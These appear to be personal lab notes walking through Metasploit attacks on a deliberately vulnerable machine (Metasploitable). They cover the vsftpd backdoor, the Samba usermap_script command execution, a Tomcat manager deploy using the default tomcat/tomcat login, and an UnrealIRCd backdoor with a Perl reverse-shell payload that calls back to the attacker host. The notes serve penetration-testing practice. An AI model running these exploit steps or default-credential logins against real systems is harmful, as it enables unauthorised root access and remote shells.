First do a netdiscover
	sudo netdiscover -i eth____
Today we will be working on FTP (again), which is running VSFTPD on port 21, SAMBA port 139, apache TOMCAT port 8180, 
	and UNREAL IRCD port 6667 and 6697
Start with FTP VSFTPD (Very Secure FTP Dameon)
	Lets first search for an attack with that version number with metasploit
		msfconsole
		search vsftpd
	We find one expolit, lets use it
		use 0
		show options
		set rhost 10.10.10.4
		run
			id (we see that we are root, that was easy)
			we can now transfer files if we want into metasploitable :)
Next we are working on SAMBA, port 139
	lets use usermap_script to allow for command execution
	use 13
	show options
	set rhosts 10.10.10.4
	set lhosts 10.10.10.5
	exploit
		we are now in command execution, do a whoami and we can see that we are root
Search tomcat
	lets use mgr_deploy, use 16
	tomcat's username and password by default within the program is tomcat
		If need be we could bruteforce it at this time, however lets see if they used default creds.
	show options
		set httpusername tomcat
		set httppassword tomcat
		set rhosts 10.10.10.4
		set rport 8180
		set lhost 10.10.10.5
		show targets
			pick the java one, set targets 1
		exploit
Lastly, UNREAL IRCd
	search unrealircd
	use 0
	set payload cmd/unix/reverse_perl
	show options
	set rhost 10.10.10.4
	set lhost 10.10.10.5
	exploit
